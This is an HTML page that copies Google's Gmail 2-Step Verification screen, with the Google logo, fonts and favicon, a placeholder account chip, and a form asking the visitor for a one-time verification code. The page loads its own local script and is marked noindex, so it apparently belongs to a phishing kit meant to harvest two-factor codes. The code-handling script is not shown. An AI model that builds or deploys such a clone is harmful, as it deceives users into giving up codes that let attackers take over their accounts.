<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Gmail 2-Step Verification">
    <meta name="robots" content="noindex, nofollow">
    <title>Gmail</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_16dp.png"
        type="image/png">
    <link rel="stylesheet" href="styles.css">
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Google+Sans+Text:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
        rel="stylesheet">
</head>

<body class="page-password">
    <div class="outer">
        <div class="card">
            <div class="pw-header">
                <!-- Google colored wordmark (Android app style) -->
                <div class="g-logo-wrap">
                    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
                            fill="#EA4335" />
                        <path
                            d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
                            fill="#FBBC05" />
                        <path
                            d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"
                            fill="#4285F4" />
                        <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853" />
                        <path
                            d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"
                            fill="#EA4335" />
                        <path
                            d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"
                            fill="#4285F4" />
                    </svg>
                </div>

                <h1 class="heading">2-Step Verification</h1>

                <div class="pw-verify-text" style="margin-top: 8px;">
                    To help keep your account safe, Google wants to make sure it's really you trying to sign in
                </div>

                <div class="chip-wrap" style="margin-top: 16px;">
                    <div class="id-chip">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
                            fill="#5f6368">
                            <path
                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                        </svg>
                        <span class="id-chip-text" id="chipEmail2sv">user@gmail.com</span>
                    </div>
                </div>
            </div>

            <form id="twosvForm" class="pw-form" novalidate style="margin-top: 24px;">
                <div style="font-size: 16px; margin-bottom: 24px; color: #202124; text-align: center;">
                    Get a verification code sent to your phone or recovery email.
                </div>

                <div class="field-wrap" id="twosvWrap" style="margin-top:0">
                    <div class="field pw-field" id="twosvField">
                        <input type="text" id="twosvInput" class="field-input" placeholder=" " autofocus
                            aria-label="Enter code" name="Code" dir="ltr" spellcheck="false"
                            autocomplete="one-time-code" />
                        <label for="twosvInput" class="field-label">Enter code</label>
                    </div>
                </div>
                <div class="err" id="twosvErr">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                    <span>Enter a valid code</span>
                </div>

                <!-- Spacer -->
                <div style="height: 20px;"></div>

                <div class="btn-row">
                    <button type="button" id="moreWaysLink" class="btn-text">More ways to verify</button>
                    <button type="submit" class="btn-blue">Next</button>
                </div>
            </form>
        </div>
    </div>

    <script src="script.js"></script>
</body>

</html>
